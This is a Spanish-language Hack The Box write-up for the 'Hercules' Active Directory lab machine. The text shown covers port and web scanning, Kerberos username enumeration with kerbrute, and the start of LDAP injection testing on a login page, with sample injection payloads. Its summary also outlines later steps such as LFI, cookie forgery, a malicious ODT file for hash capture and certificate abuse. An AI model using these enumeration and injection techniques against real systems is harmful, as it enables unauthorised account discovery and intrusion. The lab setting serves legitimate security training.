---
title: "Hercules - Hack The Box"
date: 2025-10-24
draft: false
slug: "htb-writeup-hercules"
excerpt: "Esta fue, sin duda, la máquina más difícil que he realizado en mi vida. Comenzamos con el análisis de la página web activa en el puerto 443, siendo solo un login. Le aplicamos Fuzzing, pero no encontramos algo útil. Hacemos la enumeración de usuarios vía Kerberos, logrando obtener la sintaxis usada para usuarios y una lista válida. Utilizamos la lista para aplicar inyecciones LDAP de forma automatizada con un script de Python. Logrando encontrar la contraseña de un usuario que descubrimos, es válida para otro usuario, después de aplicarle Password Spraying. Usamos al usuario y contraseña para entrar al login, obteniendo acceso. Revisando las funcionalidades de la máquina, descubrimos que es vulnerable a Local File Inclusion (LFI), descubriendo un archivo web.config que contiene los datos necesarios para forjar una cookie de Forms Authentication con ASP.NET, para que podamos obtener la sesión del usuario web_admin (Session Fixation). Creamos la cookie con un script de C# y Python, logrando suplantar al usuario web_admin. Revisando las funcionalidades de este usuario en la página, vemos que puede subir archivos de reporte. Le aplicamos un Sniper Attack con BurpSuite y descubrimos que podemos cargar archivos ODT. Aprovechamos esto para cargar un archivo malicioso ODT que nos permita capturar el Hash NTLMv2 de un usuario. Crackeamos este Hash y obtenemos la contraseña de otro usuario. Ocupamos estas credenciales para enumerar el AD usando bloodhound-python y BloodHoundV4.3.1, con tal de enumerar el AD. En la enumeración, descubrimos que podemos aplicar el Shadow Credentials Attack, generando TGTs y usando certi-py o bloodyAD para suplantar a algunos usuarios. Gracias a esto, logramos suplantar un usuario que nos permite tomar contro del OU Forest Migration. Usamos a este usuario para darnos permisos GenericAll sobre algunos grupos y habilitamos a usuarios deshabilitados que contienen ACLs que nos permiten identificar CAs vulnerables. Con este dato, logramos aplicar el ESC3 Certificate Attack: Enrollment Agent Template, que nos permite suplanta a otro usuario con mayores privilegios. Por último, rehabilitamos un usuario administrador que nos permite suplantar a otro usuario administrador, que tiene la capacidad de aplicar el S4U2self/S4U2proxy Abuse Chain Attack, con lo que logramos suplantar al usuario administrador del AD, logrando escalar privilegios máximos y ser dueño prácticamente de todo el AD."
categories: ["HackTheBox", "Insane Machine"]
tags: ["Windows", "Active Directory", "LDAP", "Kerberos", "Web Enumeration", "Fuzzing", "BurpSuite", "Kerberos Enumeration", "LDAP Injection", "Automating LDAP Injection with Python", "Password Spraying Attack", "Local File Inclusion (LFI)", "Session Fixation", "Forging FormsAuth Cookie with ASP.NET", "Sniper Attack", "Malicious ODT File", "Cracking Hash", "Cracking NTLMv2 Hash", "BloodHound and Python-BloodHound Enumeration", "Shadow Credentials Attack", "bloodyAD Enumeration", "OU Relocation (PowerView)", "OU Takeover Attack", "Rehabilitating Disabled AD Accounts", "Identifying Vulnerable CAs", "ESC3 Certificate Attack - Enrollment Agent Template", "S4U2self/S4U2proxy Abuse Chain", "Privesc - S4U2self/S4U2proxy Abuse Chain", "OSCP Style"]
tools:
  - "ping"
  - "nmap"
  - "Wappalizer"
  - "ffuf"
  - "gobuster"
  - "kerbrute"
  - "awk"
  - "wc"
  - "sed"
  - "BurpSuite"
  - "python3"
  - "netexec(nxc)"
  - "wget"
  - "chmod"
  - "dotnet"
  - "Inspector"
  - "Bad-ODF.py"
  - "responder"
  - "JohnTheRipper"
  - "bloodhound-python"
  - "BloodHoundV4.3.1"
  - "impacket-getTGT"
  - "certipy-ad"
  - "bloodyAD"
  - "PowerView"
  - "winrmexec"
  - "git"
  - "ntpdate"
  - "iconv"
  - "openssl"
  - "impacket-describeTicket"
  - "impacket-changepasswd"
  - "impacket-getST"
links:
  - "https://github.com/ropnop/kerbrute"
  - "https://documentation.sailpoint.com/connectors/active_directory/help/integrating_active_directory/ldap_names.html"
  - "https://www.verylazytech.com/ldap-injection"
  - "https://pypi.org/project/termcolor/"
  - "https://swisskyrepo.github.io/PayloadsAllTheThings/LDAP%20Injection/#methodology"
  - "https://www.blackduck.com/glossary/what-is-ldap-injection.html"
  - "https://portswigger.net/kb/issues/00100500_ldap-injection"
  - "https://gist.github.com/korrosivesec/a339e376bae22fcfb7f858426094661e"
  - "https://www.codeproject.com/articles/Hack-proof-your-asp-net-applications-from-Session#comments-section"
  - "https://medium.com/@ph4nt0mbyt3/rce-exploitation-via-report-upload-leveraging-machinekeys-to-forge-aspxauth-cookies-to-privesc-50d38991da2e"
  - "https://gist.github.com/amanda-mitchell/5350992"
  - "https://github.com/synercoder/FormsAuthentication"
  - "https://github.com/SorceryIE/aspxauth_cookie_forger/blob/main/Program.cs"
  - "https://gist.github.com/dazinator/0cdb8e1fbf81d3ed5d44"
  - "https://github.com/lof1sec/Bad-ODF"
  - "https://www.hackingarticles.in/shadow-credentials-attack/"
  - "https://medium.com/@NightFox007/exploiting-and-detecting-shadow-credentials-and-msds-keycredentiallink-in-active-directory-9268a587d204"
  - "https://github.com/ozelis/winrmexec"
  - "https://www.thehacker.recipes/ad/movement/kerberos/delegations/s4u2self-abuse"
  - "https://www.blackhillsinfosec.com/abusing-s4u2self-for-active-directory-pivoting/"
  - "https://harmj0y.medium.com/s4u2pwnage-36efe1a2777c"
showtoc: true
header:
  teaser: "/assets/images/htb-writeup-hercules/hercules.png"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 10.10.11.91
PING 10.10.11.91 (10.10.11.91) 56(84) bytes of data.
64 bytes from 10.10.11.91: icmp_seq=1 ttl=127 time=89.9 ms
64 bytes from 10.10.11.91: icmp_seq=2 ttl=127 time=68.9 ms
64 bytes from 10.10.11.91: icmp_seq=3 ttl=127 time=69.3 ms
64 bytes from 10.10.11.91: icmp_seq=4 ttl=127 time=70.1 ms

--- 10.10.11.91 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3011ms
rtt min/avg/max/mdev = 68.932/74.532/89.861/8.859 ms
```
Por el TTL sabemos que la máquina usa **Windows**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.91 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-24 16:41 CST
Initiating SYN Stealth Scan at 16:41
Scanning 10.10.11.91 [65535 ports]
Discovered open port 445/tcp on 10.10.11.91
Discovered open port 53/tcp on 10.10.11.91
Discovered open port 135/tcp on 10.10.11.91
Discovered open port 80/tcp on 10.10.11.91
Discovered open port 139/tcp on 10.10.11.91
Discovered open port 443/tcp on 10.10.11.91
Discovered open port 55376/tcp on 10.10.11.91
Discovered open port 3268/tcp on 10.10.11.91
Discovered open port 49668/tcp on 10.10.11.91
Discovered open port 5986/tcp on 10.10.11.91
Discovered open port 9389/tcp on 10.10.11.91
Discovered open port 3269/tcp on 10.10.11.91
Discovered open port 389/tcp on 10.10.11.91
Discovered open port 49664/tcp on 10.10.11.91
Increasing send delay for 10.10.11.91 from 0 to 5 due to 11 out of 36 dropped probes since last increase.
Discovered open port 54249/tcp on 10.10.11.91
Discovered open port 49681/tcp on 10.10.11.91
Discovered open port 49674/tcp on 10.10.11.91
Discovered open port 464/tcp on 10.10.11.91
Discovered open port 55403/tcp on 10.10.11.91
Discovered open port 636/tcp on 10.10.11.91
Discovered open port 88/tcp on 10.10.11.91
Discovered open port 593/tcp on 10.10.11.91
Completed SYN Stealth Scan at 16:42, 53.05s elapsed (65535 total ports)
Nmap scan report for 10.10.11.91
Host is up, received user-set (0.26s latency).
Scanned at 2025-10-24 16:41:13 CST for 53s
Not shown: 65513 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
80/tcp    open  http             syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
443/tcp   open  https            syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5986/tcp  open  wsmans           syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49664/tcp open  unknown          syn-ack ttl 127
49668/tcp open  unknown          syn-ack ttl 127
49674/tcp open  unknown          syn-ack ttl 127
49681/tcp open  unknown          syn-ack ttl 127
54249/tcp open  unknown          syn-ack ttl 127
55376/tcp open  unknown          syn-ack ttl 127
55403/tcp open  unknown          syn-ack ttl 127

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 53.15 seconds
           Raw packets sent: 262120 (11.533MB) | Rcvd: 95 (4.168KB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Son bastantes puertos y veo algunos como el **puerto 88**, que es del **servicio Kerberos**, que nos indica que nos enfrentamos a una máquina tipo **Active Directory**.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 53,80,88,135,139,389,443,445,464,593,636,3268,3269,5986,9389,49664,49668,49674,49681,54249,55376,55403 10.10.11.91 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-24 16:42 CST
Nmap scan report for 10.10.11.91
Host is up (0.072s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0

|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to https://10.10.11.91/
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-24 22:42:50Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: hercules.htb0., Site: Default-First-Site-Name)

| ssl-cert: Subject: commonName=dc.hercules.htb
| Subject Alternative Name: DNS:dc.hercules.htb, DNS:hercules.htb, DNS:HERCULES
| Not valid before: 2024-12-04T01:34:52
|_Not valid after:  2034-12-02T01:34:52
|_ssl-date: TLS randomness does not represent time
443/tcp   open  ssl/http      Microsoft IIS httpd 10.0

|_http-server-header: Microsoft-IIS/10.0
|_ssl-date: TLS randomness does not represent time
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Hercules Corp
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=hercules.htb
| Subject Alternative Name: DNS:hercules.htb
| Not valid before: 2024-12-04T01:34:56
|_Not valid after:  2034-12-04T01:44:56
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hercules.htb0., Site: Default-First-Site-Name)

| ssl-cert: Subject: commonName=dc.hercules.htb
| Subject Alternative Name: DNS:dc.hercules.htb, DNS:hercules.htb, DNS:HERCULES
| Not valid before: 2024-12-04T01:34:52
|_Not valid after:  2034-12-02T01:34:52
|_ssl-date: TLS randomness does not represent time
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hercules.htb0., Site: Default-First-Site-Name)

| ssl-cert: Subject: commonName=dc.hercules.htb
| Subject Alternative Name: DNS:dc.hercules.htb, DNS:hercules.htb, DNS:HERCULES
| Not valid before: 2024-12-04T01:34:52
|_Not valid after:  2034-12-02T01:34:52
|_ssl-date: TLS randomness does not represent time
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hercules.htb0., Site: Default-First-Site-Name)

| ssl-cert: Subject: commonName=dc.hercules.htb
| Subject Alternative Name: DNS:dc.hercules.htb, DNS:hercules.htb, DNS:HERCULES
| Not valid before: 2024-12-04T01:34:52
|_Not valid after:  2034-12-02T01:34:52
|_ssl-date: TLS randomness does not represent time
5986/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

|_http-title: Not Found
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Microsoft-HTTPAPI/2.0
| ssl-cert: Subject: commonName=dc.hercules.htb
| Subject Alternative Name: DNS:dc.hercules.htb, DNS:hercules.htb, DNS:HERCULES
| Not valid before: 2024-12-04T01:34:52
|_Not valid after:  2034-12-02T01:34:52
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49681/tcp open  msrpc         Microsoft Windows RPC
54249/tcp open  msrpc         Microsoft Windows RPC
55376/tcp open  msrpc         Microsoft Windows RPC
55403/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:

| smb2-time: 
|   date: 2025-10-24T22:43:45
|_  start_date: N/A
|_clock-skew: 3s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 99.96 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Gracias al escaneo, podemos notar cosillas interesantes:
* Tenemos activas dos páginas web, siendo que la página web del **puerto 80**, nos redirige a la página web activa en el **puerto 443**.
* El **servicio LDAP** nos da el dominio de la máquina.
* Vemos el **servicio WinRM** activo en el **puerto 5986**.
* Y por último, necesitaremos credenciales válidas para entrar al **servicio SMB**.

Registremos el dominio del **AD** en el `/etc/hosts`:
```bash
echo "10.10.11.91 hercules.htb dc.hercules.htb" >> /etc/hosts
```
Empezaremos nuestro análisis por las páginas web.

## Análisis de Vulnerabilidades {#Analisis}

### Analizando Servicio HTTPS {#HTTPS}

Entremos:

<p align="center">
<img src="/assets/images/htb-writeup-hercules/Captura1.png">
</p>

Al meter la IP nos redirige a la página web del **puerto 443**.

Parece ser una página web de una empresa que crea software, aplicaciones web y móviles, etc.

Veamos qué nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/htb-writeup-hercules/Captura2.png">
</p>

Lo más destacable es el uso del **servidor web IIS**, de ahí en fuera no hay más.

No hay más que podamos ver por aquí, ni en el código fuente.

Apliquemos **Fuzzing** para identificar directorios ocultos.

### Fuzzing {#fuzz}

Primero usemos la herramienta **ffuf**:
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u https://10.10.11.91/FUZZ -t 300

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://10.10.11.91/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 300
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

index                   [Status: 200, Size: 27342, Words: 10179, Lines: 468, Duration: 1789ms]
login                   [Status: 200, Size: 3213, Words: 927, Lines: 54, Duration: 1938ms]
home                    [Status: 302, Size: 141, Words: 6, Lines: 4, Duration: 5422ms]
default                 [Status: 200, Size: 27342, Words: 10179, Lines: 468, Duration: 4870ms]
Home                    [Status: 302, Size: 141, Words: 6, Lines: 4, Duration: 4084ms]
content                 [Status: 301, Size: 151, Words: 9, Lines: 2, Duration: 4952ms]
Default                 [Status: 200, Size: 27342, Words: 10179, Lines: 468, Duration: 5210ms]
Login                   [Status: 200, Size: 3213, Words: 927, Lines: 54, Duration: 1050ms]
Index                   [Status: 200, Size: 27342, Words: 10179, Lines: 468, Duration: 1755ms]
Content                 [Status: 301, Size: 151, Words: 9, Lines: 2, Duration: 1846ms]
INDEX                   [Status: 200, Size: 27342, Words: 10179, Lines: 468, Duration: 1063ms]
HOME                    [Status: 302, Size: 141, Words: 6, Lines: 4, Duration: 294ms]
                        [Status: 200, Size: 27342, Words: 10179, Lines: 468, Duration: 878ms]
DEFAULT                 [Status: 200, Size: 27342, Words: 10179, Lines: 468, Duration: 756ms]
LogIn                   [Status: 200, Size: 3213, Words: 927, Lines: 54, Duration: 633ms]
LOGIN                   [Status: 200, Size: 3213, Words: 927, Lines: 54, Duration: 670ms]
:: Progress: [220545/220545] :: Job [1/1] :: 482 req/sec :: Duration: [0:08:30] :: Errors: 0 ::
```

| Parámetros | Descripción |
|---|---|
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-u*       | Para indicar la URL a utilizar. |
| *-t*       | Para indicar la cantidad de hilos a usar. |

Ahora probemos con **gobuster**:
```bash
gobuster dir -u https://10.10.11.91 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 300 -k
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://10.10.11.91
[+] Method:                  GET
[+] Threads:                 300
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index                (Status: 200) [Size: 27342]
/login                (Status: 200) [Size: 3213]
/home                 (Status: 302) [Size: 141] [--> /Login?ReturnUrl=%2fhome]
/content              (Status: 301) [Size: 151] [--> https://10.10.11.91/content/]
/default              (Status: 200) [Size: 27342]
/Home                 (Status: 302) [Size: 141] [--> /Login?ReturnUrl=%2fHome]
/Default              (Status: 200) [Size: 27342]
/Index                (Status: 200) [Size: 27342]
/Login                (Status: 200) [Size: 3213]
/Content              (Status: 301) [Size: 151] [--> https://10.10.11.91/Content/]
/INDEX                (Status: 200) [Size: 27342]
/HOME                 (Status: 302) [Size: 141] [--> /Login?ReturnUrl=%2fHOME]
/DEFAULT              (Status: 200) [Size: 27342]
/LogIn                (Status: 200) [Size: 3213]
/LOGIN                (Status: 200) [Size: 3213]
Progress: 220544 / 220544 (100.00%)
===============================================================
Finished
===============================================================
```

| Parámetros | Descripción |
|---|---|
| *-u*       | Para indicar la URL a utilizar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-t*       | Para indicar la cantidad de hilos a usar. |

De entre todos los directorios que descubrimos, vemos uno que es un login:

<p align="center">
<img src="/assets/images/htb-writeup-hercules/Captura3.png">
</p>

Ahí vemos un icono que, al darle clic, nos dará un mensaje:

<p align="center">
<img src="/assets/images/htb-writeup-hercules/Captura4.png">
</p>

Entonces, aplicar fuerza bruta no es una buena opción, pues podemos bloquear este login por X cantidad de tiempo.

Enumeremos otros servicios.

### Enumeración de Servicio Kerberos {#kerberos}

Para aplicar la enumeración, utilizaremos la herramienta **kerbrute**:
* <a href="https://github.com/ropnop/kerbrute" target="_blank">Repositorio de ropnop: kerbrute</a>

Vamos a enumerar los usuarios existentes:
```bash
/kerbrute_linux_386 userenum --dc 10.10.11.91 -d hercules.htb /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -t 200

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 10/24/25 - Ronnie Flathers @ropnop

2025/10/24 19:21:34 >  Using KDC(s):
2025/10/24 19:21:34 >  	10.10.11.91:88

2025/10/24 19:21:35 >  [+] VALID USERNAME:	 admin@hercules.htb
2025/10/24 19:21:49 >  [+] VALID USERNAME:	 administrator@hercules.htb
2025/10/24 19:21:50 >  [+] VALID USERNAME:	 Admin@hercules.htb
2025/10/24 19:23:26 >  [+] VALID USERNAME:	 Administrator@hercules.htb
2025/10/24 19:26:09 >  [+] VALID USERNAME:	 auditor@hercules.htb
2025/10/24 19:32:53 >  [+] VALID USERNAME:	 ADMIN@hercules.htb
2025/10/24 21:34:30 >  [+] VALID USERNAME:	 will.s@hercules.htb
```
Después de dejarlo bastante tiempo corriendo, obtenemos un usuario que nos da una pista de la sintaxis para el nombre de los usuarios que están utilizando, siendo el nombre del usuario y una letra (supongo que es de su apellido).

Entonces, vamos a crear un wordlist que tenga nombre de usuarios, pero siguiendo esta sintaxis.

Utilizaremos como plantilla el wordlist `/usr/share/wordlists/seclists/Usernames/Names/names.txt`, ya que solo contiene nombres reales de personas:
```bash
awk 'NF{ for(i=97;i<=122;i++) printf "%s.%c\n", $0, i }' /usr/share/wordlists/seclists/Usernames/Names/names.txt > names_ad.txt

wc -l names_ad.txt
264602 names_ad.txt
```
Ya tenemos nuestro wordlist.

Solo expliquemos rápidamente este comando:
* **NF** evita líneas vacías. 
* El bucle `i=97..122` imprime `nombre.<letra>` usando el **código ASCII**.

Utilicemos este wordlist y veamos cuántos usuarios podemos obtener:
```bash
./kerbrute_linux_386 userenum --dc 10.10.11.91 -d hercules.htb names_ad.txt -t 150

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 10/24/25 - Ronnie Flathers @ropnop

2025/10/24 17:02:57 >  Using KDC(s):
2025/10/24 17:02:57 >  	10.10.11.91:88

2025/10/24 17:03:21 >  [+] VALID USERNAME:	 adriana.i@hercules.htb
2025/10/24 17:04:23 >  [+] VALID USERNAME:	 angelo.o@hercules.htb
2025/10/24 17:08:03 >  [+] VALID USERNAME:	 ashley.b@hercules.htb
2025/10/24 17:09:48 >  [+] VALID USERNAME:	 bob.w@hercules.htb
2025/10/24 17:10:31 >  [+] VALID USERNAME:	 camilla.b@hercules.htb
2025/10/24 17:11:53 >  [+] VALID USERNAME:	 clarissa.c@hercules.htb
2025/10/24 17:14:38 >  [+] VALID USERNAME:	 elijah.m@hercules.htb
2025/10/24 17:15:54 >  [+] VALID USERNAME:	 fiona.c@hercules.htb
2025/10/24 17:17:36 >  [+] VALID USERNAME:	 harris.d@hercules.htb
2025/10/24 17:17:42 >  [+] VALID USERNAME:	 heather.s@hercules.htb
2025/10/24 17:18:43 >  [+] VALID USERNAME:	 jacob.b@hercules.htb
2025/10/24 17:19:23 >  [+] VALID USERNAME:	 jennifer.a@hercules.htb
2025/10/24 17:19:34 >  [+] VALID USERNAME:	 jessica.e@hercules.htb
2025/10/24 17:19:49 >  [+] VALID USERNAME:	 joel.c@hercules.htb
2025/10/24 17:19:49 >  [+] VALID USERNAME:	 johanna.f@hercules.htb
2025/10/24 17:19:50 >  [+] VALID USERNAME:	 johnathan.j@hercules.htb
2025/10/24 17:21:07 >  [+] VALID USERNAME:	 ken.w@hercules.htb
2025/10/24 17:24:21 >  [+] VALID USERNAME:	 mark.s@hercules.htb
2025/10/24 17:25:22 >  [+] VALID USERNAME:	 mikayla.a@hercules.htb
2025/10/24 17:26:18 >  [+] VALID USERNAME:	 nate.h@hercules.htb
2025/10/24 17:26:21 >  [+] VALID USERNAME:	 natalie.a@hercules.htb
2025/10/24 17:27:35 >  [+] VALID USERNAME:	 patrick.s@hercules.htb
2025/10/24 17:28:35 >  [+] VALID USERNAME:	 ramona.l@hercules.htb
2025/10/24 17:28:42 >  [+] VALID USERNAME:	 ray.n@hercules.htb
2025/10/24 17:28:56 >  [+] VALID USERNAME:	 rene.s@hercules.htb
2025/10/24 17:30:43 >  [+] VALID USERNAME:	 shae.j@hercules.htb
2025/10/24 17:31:51 >  [+] VALID USERNAME:	 stephanie.w@hercules.htb
2025/10/24 17:31:53 >  [+] VALID USERNAME:	 stephen.m@hercules.htb
2025/10/24 17:32:26 >  [+] VALID USERNAME:	 tanya.r@hercules.htb
2025/10/24 17:33:03 >  [+] VALID USERNAME:	 tish.c@hercules.htb
2025/10/24 17:34:00 >  [+] VALID USERNAME:	 vincent.g@hercules.htb
2025/10/24 17:34:25 >  [+] VALID USERNAME:	 will.s@hercules.htb
2025/10/24 17:35:03 >  [+] VALID USERNAME:	 zeke.s@hercules.htb
2025/10/24 17:35:10 >  Done! Tested 264602 usernames (33 valid) in 1932.819 seconds
```
Excelente, tenemos bastantes usuarios.

Guarda solo el resultado en un archivo de texto y de este, obtendremos los usuarios completos y solo los nombres de los usuarios:
```bash
# Obteniendo los usuarios completos
sed -n 's/.*VALID USERNAME:[[:space:]]*\([^[:space:]]*\).*/\1/p' resultadoKer.txt > full_users.txt

# Obteniendo solo los nombres de los usuarios
sed -n 's/.*VALID USERNAME:[[:space:]]*\([^@[:space:]]*\)@.*/\1/p' resultadoKer.txt > only_names.txt
```
Muy bien, estos wordlists nos pueden servir para más adelante.

### Análisis de Login de Página Web del Puerto 443 {#login}

La idea es identificar si es posible que podamos abusar de este login, siendo la principal el ver cómo trata la data que le damos.

Captura un intento de sesión con **BurpSuite** y envía la captura al **Repeater**:

<p align="center">
<img src="/assets/images/htb-writeup-hercules/Captura5.png">
</p>

Algo muy común en ambientes **AD** es utilizar el **servicio LDAP** como método de autenticación en otros servicios/protocolos.

Posiblemente, este login utilice **LDAP** para la autenticación.

Podemos aplicar **inyecciones LDAP** para confirmar no solo si se usa **LDAP** en el login, sino que podemos explotarlo para tratar de ganar acceso.

Vamos a probarlo.

## Explotación de Vulnerabilidades {#Explotacion}

### Aplicando Inyecciones LDAP en Login {#LDAP}

Para que podamos entender cómo funcionan las **Inyecciones LDAP**, primero debemos saber cómo es que se construyen las consultas en **LDAP**, que son conocidas como **Filtros LDAP**:

| **Filtro LDAP** |
|:---------------:|
| *Un filtro LDAP es una expresión entre paréntesis que indica qué entradas del directorio deben coincidir. Es análogo a la cláusula WHERE de SQL, pero con su propia sintaxis.* |

Esta es la sintaxis que se utiliza: `(<atributo><operador><valor>)`.

Para el caso de los atributos, te dejo un link que muestra una lista con los **nombres de atributos LDAP** que se utilizan en un **AD**:
* <a href="https://documentation.sailpoint.com/connectors/active_directory/help/integrating_active_directory/ldap_names.html" target="_blank">List of LDAP Attribute Names and Associated Name in Active Directory</a>

De acuerdo con esta lista, posiblemente el filtro que se ocupe en el login, sea alguno de estos:
```bash
(cn=will.s*)(password=contraseña)
(sAMAccountName=will.s*)(description=a*)
```

Podemos tratar de aplicar inyecciones para obtener la contraseña, pero tenemos que tomar en cuenta la **sintaxis RFC 4545**:

| **Sintaxis RFC 4545** |
|:---------------------:|
| *El RFC 4515 define la sintaxis para una representación en cadena legible por humanos de los filtros de búsqueda LDAP, que se incluyen entre paréntesis y se estructuran utilizando operadores como & (AND), | (OR), ! (NOT) y operadores de comparación (por ejemplo, =). Los filtros pueden ser simples, como (cn=John Doe), o complejos, combinando varias condiciones, como (&(uid=test)(|(cn=John)(cn=Jane))). Los caracteres especiales dentro de los valores de los filtros deben escaparse con una barra invertida seguida del valor hexadecimal de dos dígitos del carácter, (por ejemplo, splat(asterisco) se convierte en \2a.* |

Es posible que tengamos que aplicar codificaciones para que las inyecciones funcionen.

Ahora sí, ¿Qué son las **Inyecciones LDAP**?

| **Inyecciones LDAP** |
|:--------------------:|
| *Una inyección LDAP es una vulnerabilidad que ocurre cuando una aplicación construye consultas o filtros LDAP concatenando datos del usuario sin validarlos ni escaparlos. Si un atacante introduce caracteres o fragmentos de filtro maliciosos, puede alterar la consulta LDAP que el servidor ejecuta y así filtrar, enumerar, eludir autenticación o en algunos casos extraer información sensible. En vez de pasar un username limpio al filtro LDAP, la aplicación inserta el valor tal cual y eso permite que el atacante cambie la semántica del filtro.* |

Entonces, debemos enfocar las inyecciones en el parámetro **username**.

Nuestro objetivo es descubrir, cuál de todos los usuarios que hemos capturado es válido para este login.

Aquí te dejo un par de blogs que tienen payloads para **Inyecciones LDAP**:
* <a href="https://www.verylazytech.com/ldap-injection" target="_blank">LDAP Injection</a>
* <a href="https://swisskyrepo.github.io/PayloadsAllTheThings/LDAP%20Injection/" target="_blank">Payloads All The Things: LDAP Injection</a>

Como prueba, usare el siguiente payload:
```bash
*(
)
)(
)(!(
)(!(&(|
```

Utiliza la captura que ya tienes en el **Repeater** de **BurpSuite**:

<p align="center">
<img src="/assets/images/htb-writeup-hercules/Captura6.png">
</p>

Obtenemos un **invalid username**.

Esto como tal no nos dice nada, solo que es posible el uso de **LDAP** en el login.

